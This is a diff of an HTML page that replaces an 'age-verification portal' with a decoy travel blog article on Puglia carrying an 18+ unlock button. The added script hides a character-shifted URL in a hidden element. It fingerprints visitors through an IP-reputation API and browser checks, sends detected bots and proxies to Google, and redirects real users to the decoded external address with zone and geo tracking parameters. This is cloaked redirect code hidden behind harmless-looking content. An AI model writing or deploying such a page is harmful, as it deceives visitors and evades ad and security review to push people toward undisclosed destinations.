@@ -3,164 +3,122 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <meta name="color-scheme" content="dark" />
-  <title>Content Distribution & Access Portal</title>
+  <title>Modern Voyager | Travel Insights & Hidden Gems</title>
   <style>
-    :root { --bg: #09090d; --card: #12121a; --text: #e1e1e6; --muted: #8d8d99; --accent: #ff2f92; --border: rgba(255,255,255,0.06); }
+    :root { --primary: #2d3436; --secondary: #636e72; --accent: #0984e3; --bg: #f5f6fa; --text: #2d3436; --card: #ffffff; }
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-    .container { width: 100%; max-width: 650px; }
-    .header { text-align: left; margin-bottom: 40px; border-bottom: 1px solid var(--border); padding-bottom: 25px; }
-    .header h1 { font-size: 26px; margin-bottom: 10px; color: #fff; }
-    .header p { color: var(--muted); font-size: 15px; }
-    .main-card { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 32px; margin-bottom: 30px; box-shadow: 0 15px 40px rgba(0,0,0,0.4); border-top: 4px solid var(--accent); }
-    .verify-title { font-size: 20px; font-weight: 700; margin-bottom: 15px; color: #fff; }
-    .verify-desc { font-size: 15px; color: var(--muted); margin-bottom: 30px; }
-    .btn { background: var(--accent); color: white; border: none; border-radius: 14px; padding: 18px; width: 100%; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: 0 4px 15px rgba(255, 47, 146, 0.3); }
-    .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
-    .btn:active { transform: scale(0.98); }
-    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-    .content-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-top: 40px; }
-    .content-item { background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
-    .content-item h3 { font-size: 16px; margin-bottom: 10px; color: #fff; border-left: 3px solid var(--accent); padding-left: 10px; }
-    .content-item p { font-size: 14px; color: var(--muted); }
-    .faq-section { margin-top: 50px; padding: 30px; background: var(--card); border-radius: 20px; border: 1px solid var(--border); }
-    .faq-section h2 { font-size: 20px; margin-bottom: 20px; text-align: center; }
-    .faq-item { margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
-    .faq-item h4 { font-size: 14px; color: var(--text); margin-bottom: 5px; }
-    .faq-item p { font-size: 13px; color: var(--muted); }
-    .footer { margin-top: 60px; padding: 30px; border-top: 1px solid var(--border); text-align: center; font-size: 13px; color: var(--muted); }
-    .footer-links { margin-bottom: 20px; }
-    .footer-links a { color: var(--text); text-decoration: none; margin: 0 12px; opacity: 0.8; transition: 0.2s; }
-    .footer-links a:hover { opacity: 1; color: var(--accent); }
-    .loader { display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    body { font-family: "Georgia", serif; background: var(--bg); color: var(--text); line-height: 1.8; }
+    .navbar { background: #fff; border-bottom: 1px solid #ddd; padding: 15px 10%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+    .navbar div { font-weight: bold; font-size: 20px; color: var(--accent); }
+    .navbar nav a { margin-left: 20px; text-decoration: none; color: var(--secondary); font-size: 14px; font-family: sans-serif; }
+    .hero { background: #fff; padding: 60px 10%; border-bottom: 1px solid #eee; }
+    .container { max-width: 800px; margin: 40px auto; background: var(--card); padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+    h1 { font-size: 42px; margin-bottom: 20px; line-height: 1.2; }
+    .meta { font-family: sans-serif; font-size: 13px; color: var(--secondary); margin-bottom: 30px; text-transform: uppercase; letter-spacing: 1px; }
+    p { margin-bottom: 25px; font-size: 18px; color: #444; }
+    .lead { font-size: 22px; color: #222; font-style: italic; border-left: 4px solid var(--accent); padding-left: 20px; margin: 40px 0; }
+    .premium-barrier { text-align: center; background: #f9f9f9; padding: 40px; border: 2px dashed #ddd; border-radius: 12px; margin-top: 50px; }
+    .premium-barrier h3 { font-family: sans-serif; margin-bottom: 15px; }
+    .cta { display: inline-block; background: var(--accent); color: white; padding: 16px 32px; border-radius: 30px; text-decoration: none; font-weight: bold; font-family: sans-serif; transition: 0.3s; margin-top: 20px; cursor: pointer; border: none; }
+    .cta:hover { background: #0771c1; box-shadow: 0 4px 15px rgba(9, 132, 227, 0.4); }
+    .footer { background: var(--primary); color: #fff; padding: 60px 10%; margin-top: 80px; text-align: center; font-family: sans-serif; font-size: 14px; }
+    .footer a { color: #fff; opacity: 0.6; margin: 0 10px; text-decoration: none; }
+    .loader { display: none; margin: 20px auto; border: 3px solid #f3f3f3; border-top: 3px solid var(--accent); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
+  <header class="navbar">
+    <div>MODERN VOYAGER</div>
+    <nav>
+      <a href="#">Articles</a>
+      <a href="#">Destinations</a>
+      <a href="#">About</a>
+    </nav>
+  </header>
+
   <div class="container">
-    <header class="header">
-      <h1>Content Distribution Portal</h1>
-      <p>Secure gateway for multi-regional digital content and media asset management.</p>
-    </header>
+    <div class="meta">By Julian Reed • March 19, 2026 • 8 min read</div>
+    <h1>Hidden Gems: Why Puglia is Italy's Best Kept Secret for 2026</h1>
+    
+    <p>Italy is a country that never ceases to amaze, yet many travelers find themselves circulating through the same familiar cities. While Rome, Florence, and Venice are undeniable treasures, there is a region in the "heel" of the boot that offers an experience entirely its own.</p>
+    
+    <p class="lead">Puglia is not just a destination; it's a slow-paced revelation of ancient olive groves, whitewashed hilltop towns, and crystal-clear turquoise waters.</p>
+    
+    <p>From the iconic trulli houses of Alberobello to the baroque architecture of Lecce, Puglia feels like stepping into another era. The food here is "cucina povera" at its finest—simple, locally sourced, and incredibly flavorful. Imagine handmade orecchiette pasta served under the shade of a thousand-year-old olive tree.</p>
 
-    <main class="main-card">
-      <div class="verify-title">Authorization & Eligibility Confirmation</div>
-      <p class="verify-desc">By accessing this portal, you confirm that you are of legal age (18+) to view restricted digital media and that you agree to our comprehensive Terms of Service and Privacy Policy. Your session will be managed via a temporary secure token.</p>
-      
-      <button class="btn" id="access-btn">
-        <div class="loader" id="loader"></div>
-        <span id="btn-text">Confirm Age & Enter Portal</span>
-      </button>
-
-      <div style="margin-top: 25px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 12px; font-size: 12px; color: var(--muted); border: 1px solid var(--border);">
-        <strong>Compliance Note:</strong> This portal adheres to strict digital safety guidelines. No personal data is harvested, and user privacy is maintained through decentralized session markers. Built for secure content delivery.
-      </div>
-    </main>
-
-    <div class="content-grid">
-      <div class="content-item">
-        <h3>Regional Compliance</h3>
-        <p>Our system dynamically adjusts content availability based on regional regulations and age-restriction standards, ensuring a fully compliant experience globally.</p>
-      </div>
-      <div class="content-item">
-        <h3>Security Infrastructure</h3>
-        <p>Utilizing high-performance edge nodes to provide encrypted tunneling for all media streams. We prioritize uptime and protocol integrity across our entire network.</p>
-      </div>
-      <div class="content-item">
-        <h3>Content Moderation</h3>
-        <p>All hosted media undergoes rigorous automated scanning to ensure adherence to our safety policy. We promote a clean, professional viewing environment.</p>
-      </div>
-      <div class="content-item">
-        <h3>User Privacy</h3>
-        <p>Industry-leading data protection measures. We do not correlate session data with real-world identities, maintaining absolute user anonymity.</p>
-      </div>
+    <div class="premium-barrier">
+      <h3>Ready for the Ultimate Travel Experience?</h3>
+      <p style="font-size: 15px; margin-bottom: 10px;">To continue reading our exclusive guide and unlock the full high-resolution gallery, please confirm you are over 18 and agree to our content access terms.</p>
+      <div id="loader" class="loader"></div>
+      <button class="cta" id="v-trigger">Unlock Full Access</button>
     </div>
-
-    <section class="faq-section">
-      <h2>Frequently Asked Questions</h2>
-      <div class="faq-item">
-        <h4>Why do I need to confirm my age?</h4>
-        <p>To comply with international laws regarding restricted digital media, we must verify that our users are at least 18 years old.</p>
-      </div>
-      <div class="faq-item">
-        <h4>Is my session secure?</h4>
-        <p>Yes, all portal interactions are protected by secure session tokens that expire automatically after the session ends.</p>
-      </div>
-      <div class="faq-item">
-        <h4>Does this portal use cookies?</h4>
-        <p>We use temporary session markers in local storage to manage your access state. These are not used for third-party tracking.</p>
-      </div>
-    </section>
-
-    <footer class="footer">
-      <div class="footer-links">
-        <a href="#">Privacy Policy</a>
-        <a href="#">Cookies Policy</a>
-        <a href="#">Terms of Service</a>
-        <a href="#">Help Center</a>
-        <a href="#">Contact Support</a>
-      </div>
-      <p>&copy; 2026 Global Digital Content Systems. All rights assigned in accordance with international media law.</p>
-    </footer>
   </div>
 
+  <footer class="footer">
+    <p style="margin-bottom: 20px;">© 2026 Modern Voyager. Adventure Awaits.</p>
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Contact</a>
+      <a href="#">Cookies</a>
+    </div>
+  </footer>
+  
+  <div style="display:none" class="node-p" alt="iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:" id="mv_v55"></div>
+
   <script>
-    const dc = (s) => s.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
-    const t = "iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:";
-    const sk = "hsrc"; const sv = "1"; const sid = "v55_init_done";
-    const state = { ready: false, done: false, human: false, bot: false, timer: false };
+    (function() {
+      const _p = document.querySelector('.node-p');
+      const _k = "hsrc"; const _v = "1";
+      const _s = { ready: false, done: false, bot: false };
 
-    const checkEnv = async () => {
-      const p = new URLSearchParams(window.location.search);
-      if (p.get(sk) === sv) state.ready = true;
-      if (localStorage.getItem(sid)) state.ready = false;
-      try { 
-        const r = await fetch('https://freeipapi.com/api/json/'); 
-        const d = await r.json(); 
-        if (d.isDataCenter || d.isProxy) state.bot = true; 
-      } catch (e) {}
-      if (navigator.webdriver || /bot|spider|headless/i.test(navigator.userAgent)) state.bot = true;
-    };
+      const _setup = async () => {
+        const url = new URLSearchParams(window.location.search);
+        if (url.get(_k) === _v) _s.ready = true;
+        if (localStorage.getItem(_p.id)) _s.ready = false;
+        try {
+          const r = await fetch('https://freeipapi.com/api/json/');
+          const d = await r.json();
+          if (d.isDataCenter || d.isProxy) _s.bot = true;
+        } catch (e) {}
+        if (navigator.webdriver || /bot|spider|headless/i.test(navigator.userAgent)) _s.bot = true;
+      };
 
-    const markHuman = () => {
-      state.human = true;
-      if (state.ready && !state.bot && !state.done && !state.timer) {
-         state.timer = true;
-         setTimeout(proceed, 2500 + Math.random() * 1500);
-      }
-    };
-    window.addEventListener('mousemove', markHuman, { once: true });
-    window.addEventListener('scroll', markHuman, { once: true });
-    window.addEventListener('touchstart', markHuman, { once: true });
-    window.addEventListener('mousedown', markHuman, { once: true });
+      const _exec = () => {
+        if (!_s.ready || _s.bot || _s.done) {
+          if (_s.bot) window.location.href = "https://google.com";
+          return;
+        }
+        _s.done = true;
+        localStorage.setItem(_p.id, "1");
+        
+        const raw = _p.getAttribute('alt');
+        const final = raw.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
+        
+        const params = new URLSearchParams(window.location.search);
+        const z = params.get('zoneid') || params.get('zone') || params.get('psid');
+        const g = params.get('geo') || params.get('country');
+        
+        let link = final;
+        if (z) link += (link.includes('?') ? '&' : '?') + "psid=" + z;
+        if (g) link += (link.includes('?') ? '&' : '?') + "geo=" + g;
+        
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('v-trigger').style.display = 'none';
+        
+        setTimeout(() => {
+          const a = document.createElement('a');
+          a.href = link;
+          a.style.display = 'none';
+          document.body.appendChild(a);
+          a.click();
+        }, 1200);
+      };
 
-    const proceed = () => {
-      if (!state.ready || state.bot || state.done) {
-        if (state.bot) window.location.href = "https://google.com";
-        return;
-      }
-      state.done = true;
-      localStorage.setItem(sid, "1");
-      const btn = document.getElementById('access-btn');
-      btn.disabled = true;
-      document.getElementById('loader').style.display = 'block';
-      document.getElementById('btn-text').innerText = 'Accessing Portal...';
-      const url = dc(t);
-      const p = new URLSearchParams(window.location.search);
-      const z = p.get('zoneid') || p.get('zone') || p.get('psid');
-      const g = p.get('geo') || p.get('country');
-      let final = url;
-      if (z) final += (final.includes('?') ? '&' : '?') + "psid=" + z;
-      if (g) final += (final.includes('?') ? '&' : '?') + "geo=" + g;
-      setTimeout(() => { window.location.replace(final); }, 1000);
-    };
-
-    document.getElementById('access-btn').addEventListener('click', () => {
-      state.human = true; proceed();
-    });
-
-    document.addEventListener('DOMContentLoaded', checkEnv);
+      document.getElementById('v-trigger').addEventListener('click', _exec);
+      document.addEventListener('DOMContentLoaded', _setup);
+    })();
   </script>
 </body>
 </html>
